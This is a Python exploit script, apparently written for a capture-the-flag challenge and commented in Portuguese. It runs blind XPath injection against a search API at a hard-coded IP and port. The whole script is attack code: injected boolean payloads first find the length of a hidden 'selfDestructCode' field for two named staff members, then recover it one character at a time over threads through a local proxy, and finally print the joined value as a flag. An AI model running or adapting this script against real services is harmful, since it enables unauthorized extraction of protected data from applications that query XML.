import requests
import string
import concurrent.futures

# URL do endpoint
url = "http://94.237.48.20:55576/api/search"

proxy = { "http": "http://127.0.0.1:8080" }
names = ["Groorg", "Bobhura"]

headers = {
    "Content-Type": "application/json",
    "Origin": "http://94.237.48.20:55576"
}

chars = string.ascii_letters + string.digits + '!"#$-.?@_{}~'

# Função para verificar o comprimento do conteúdo de <selfDestructCode> do usuário Groorg
def get_self_destruct_code_length(name):
    for length in range(1, 100):  # Supondo que o comprimento máximo seja 100
        payload = f"' or boolean(/military/district/staff[name='{name}' and string-length(selfDestructCode)={length}]) and '1'='1"
        response = requests.post(url, json={"search": payload}, proxies=proxy, headers=headers)
        data = response.json()
        keys = list(data.keys())

        if keys[1] == "success" and data["success"] == 1:
            return length
    return 0

# Função para verificar cada caractere individualmente do <selfDestructCode> do usuário Groorg
def get_self_destruct_code_char(name, position):
    for char in chars:
        payload = f"' or boolean(/military/district/staff[name='{name}' and substring(selfDestructCode, {position}, 1)='{char}']) and '1'='1"
        response = requests.post(url, json={"search": payload}, proxies=proxy, headers=headers)
        data = response.json()
        keys = list(data.keys())

        if keys[1] == "success" and data["success"] == 1:
            print(f"Found char: {char}", end='\r')
            return char
    return ''

# Função para obter o conteúdo completo de <selfDestructCode> do usuário Groorg
def get_self_destruct_code(name):
    length = get_self_destruct_code_length(name)
    code_chars = [''] * length  # Lista para armazenar os caracteres na ordem correta
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_char = {executor.submit(get_self_destruct_code_char, name, i): i for i in range(1, length + 1)}
        for future in concurrent.futures.as_completed(future_to_char):
            position = future_to_char[future]
            try:
                char = future.result()
                code_chars[position - 1] = char  # Armazena o caractere na posição correta
            except Exception as exc:
                print(f"Thread {position} generated an exception: {exc}")
    return ''.join(code_chars)  # Concatena os caracteres na ordem correta

if __name__ == "__main__":
    flag = ''
    for name in names:  
        flag += get_self_destruct_code(name)
    print(f"Flag: {flag}")